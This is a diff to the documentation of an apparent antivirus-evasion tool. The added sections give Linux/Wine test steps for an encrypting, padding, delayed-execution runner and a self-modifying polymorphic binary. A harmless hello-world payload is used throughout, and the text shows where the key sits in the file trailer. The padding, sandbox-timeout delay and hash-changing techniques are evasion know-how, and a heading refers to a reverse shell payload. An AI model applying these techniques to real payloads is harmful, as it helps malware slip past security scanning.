@@ -230,6 +230,42 @@ Hello from Hidden-Bytes!
 
 The file is ~104 MB: the runner stub (~3 MB) + 101 MB padding + encrypted payload + trailer.
 
+#### Step 8 — Quick test on Linux (with Wine)
+
+The evasion tool builds and runs natively on Linux, but its output is a Windows `.exe`. To test the full encrypt-decrypt-execute cycle without a Windows VM, use a compiled Go binary as the payload and run the result with Wine:
+
+```bash
+# 1. Create a tiny Go program that prints a message
+cat > /tmp/hello.go << 'EOF'
+package main
+import "fmt"
+func main() { fmt.Println("Hello from hidden-bytes payload!") }
+EOF
+
+# 2. Cross-compile it as a Windows .exe
+GOOS=windows GOARCH=amd64 go build -o hello.exe /tmp/hello.go
+
+# 3. Encrypt it with the evasion tool
+./evasion --encrypt hello.exe --output evaded.exe --add-size 1 --delay 5
+
+# 4. Run the evaded binary through Wine
+wine ./evaded.exe
+```
+
+Expected output:
+
+```text
+[INFO] Hidden-Bytes self-extracting runner.
+[INFO] Execution delayed by 5 seconds...
+[INFO] Binary decrypted successfully.
+[INFO] Target program executed.
+Hello from hidden-bytes payload!
+```
+
+> **Why a compiled binary?** The runner executes the decrypted payload directly (`exec.Command`). A Python `.py` file is not a Windows executable, so it won't produce visible output. Always use a compiled `.exe` as the target when testing the evasion tool.
+
+> **Wine requirement:** Install Wine with `sudo apt install wine` (or `wine64`). The 64-bit Wine package is enough for the Go-compiled PE32+ binaries.
+
 ### 4.4 Output file layout
 
 The evasion tool produces a single file with this structure:
@@ -260,7 +296,52 @@ The evasion tool produces a single file with this structure:
 
 The runner reads **backwards from the end**: it finds `HBX1`, reads the metadata length, parses the JSON metadata, then extracts the ciphertext at the known offset. The key and nonce are in the metadata, so the file is completely self-contained.
 
-### 4.5 How the runner enforces the delay
+### 4.5 Where is the key?
+
+The AES-256 key and nonce are stored **in plain text** inside the JSON metadata trailer at the end of the output file. Anyone who can read the file can extract and inspect them:
+
+```bash
+# Extract the JSON metadata from the last bytes of the file
+tail -c 200 evaded.exe | strings
+```
+
+Output:
+
+```json
+{
+  "key": "X+2LQfKry5jFX2h1CXsIqt2xu6llpLpFI6cYLSgfbxE=",
+  "nonce": "cF+NX1pbwQTdKHXT",
+  "delay": 5,
+  "original_name": "hello.exe",
+  "original_size": 1904640,
+  "ciphertext_len": 1904656
+}
+```
+
+You can also parse it programmatically:
+
+```bash
+# Read the metadata length (last 8 bytes: 4-byte length + "HBX1")
+# Then extract the exact JSON block
+python3 -c "
+import struct, json, sys
+data = open('evaded.exe', 'rb').read()
+assert data[-4:] == b'HBX1', 'not a valid HBX1 file'
+meta_len = struct.unpack('>I', data[-8:-4])[0]
+meta = json.loads(data[-8 - meta_len:-8])
+print(json.dumps(meta, indent=2))
+"
+```
+
+**Why is the key stored in the file?** The encryption is not meant to protect the payload from someone who has the file. Its purpose is:
+
+1. **Anti-signature**: the payload is AES-256-GCM ciphertext, so static scanners cannot match byte patterns or signatures.
+2. **Anti-sandbox**: the delay forces the sandbox to time out before decryption begins.
+3. **Self-contained execution**: the runner needs no external configuration or key server — it carries everything it needs.
+
+This is a deliberate design tradeoff, not a vulnerability. If secret-key protection were needed, the key would be fetched from a remote server at runtime — but that adds a network dependency and a different detection surface.
+
+### 4.6 How the runner enforces the delay
 
 The delay is stored in the metadata and enforced by the runner **before** decryption begins. The tool does not need to be running.
 
@@ -281,7 +362,7 @@ The delay is stored in the metadata and enforced by the runner **before** decryp
 
 A sandbox that times out at 60 seconds never sees the payload execute. This is exactly why modern defence uses **behavioural monitoring**, not just sandbox analysis.
 
-### 4.6 Encryption flow
+### 4.7 Encryption flow
 
 ```mermaid
 flowchart TD
@@ -374,6 +455,73 @@ Three runs, three distinct hashes, identical behaviour.
 sha256sum variant_a.exe variant_b.exe
 # Different hashes — each uses a fresh key, nonce, and random padding
 ```
+
+#### Step 5 — Quick test on Linux (with Wine)
+
+Like the evasion tool, the polymorphic output is a Windows `.exe`. To test the full cycle on Linux — generate, run, observe self-modification — use a compiled Go binary as the payload:
+
+```bash
+# 1. Create a tiny Go program
+cat > /tmp/hello.go << 'EOF'
+package main
+import "fmt"
+func main() { fmt.Println("Hello from polymorphic payload!") }
+EOF
+
+# 2. Cross-compile it as a Windows .exe
+GOOS=windows GOARCH=amd64 go build -o hello.exe /tmp/hello.go
+
+# 3. Generate the polymorphic binary
+./polymorphic --generate poly.exe --payload hello.exe
+
+# 4. Record the hash before running
+sha256sum poly.exe
+
+# 5. Run it through Wine
+wine ./poly.exe
+
+# 6. Record the hash after running — it should be different
+sha256sum poly.exe
+```
+
+Expected output:
+
+```text
+$ sha256sum poly.exe
+a1b2c3d4e5f6...  poly.exe
+
+$ wine ./poly.exe
+[INFO] Polymorphic signature updated successfully.
+Hello from polymorphic payload!
+
+$ sha256sum poly.exe
+f7e8d9c0b1a2...  poly.exe   ← different hash, same behaviour
+```
+
+> **Why not a `.py` file?** The stub executes the decrypted payload with `exec.Command()`. A Python script is not a Windows executable — it needs `python.exe` to interpret it. Use a compiled `.exe` for Linux/Wine testing. On a real Windows VM with Python installed, `.py` payloads work because Windows associates the extension with the Python interpreter.
+
+#### Step 6 — Inspect the metadata and key
+
+The polymorphic binary stores its key in the same JSON trailer format as the evasion tool:
+
+```bash
+tail -c 300 poly.exe | strings
+```
+
+Output:
+
+```json
+{
+  "key": "base64-encoded-aes-256-key",
+  "nonce": "base64-encoded-nonce",
+  "original_name": "hello.exe",
+  "original_size": 1904640,
+  "ciphertext_len": 1904656,
+  "stub_size": 3230208
+}
+```
+
+After each run, the key, nonce, ciphertext, and padding all change — but the decrypted payload stays the same. The `stub_size` field tells the stub where its own bytes end, so it knows which part of the file to preserve and which part to rewrite.
 
 ### 5.4 The reverse shell payload
 
